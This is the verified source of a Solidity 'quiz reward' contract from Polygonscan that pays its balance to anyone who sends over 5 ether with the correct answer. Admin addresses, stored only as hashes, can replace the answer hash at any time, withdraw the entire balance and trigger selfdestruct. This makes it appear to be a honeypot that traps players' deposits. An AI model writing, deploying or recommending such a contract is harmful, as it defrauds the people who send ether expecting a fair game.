/**
 *Submitted for verification at polygonscan.com on 2022-08-14
*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.0;
contract Quiz_Reward{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 5 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 responseHash;
    address payable destructor;

     mapping (bytes32=>bool) admin;

    function Start(string calldata _question, string calldata _response) public payable isAdmin{
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor(bytes32[] memory admins, address payable _destructor) {
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;
        }
        destructor = _destructor;
    }

    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    function kill() public payable Destructor{
        selfdestruct(destructor);
    }

    modifier Destructor(){
        require(msg.sender == destructor);
        _;
    }

    fallback() external {}
}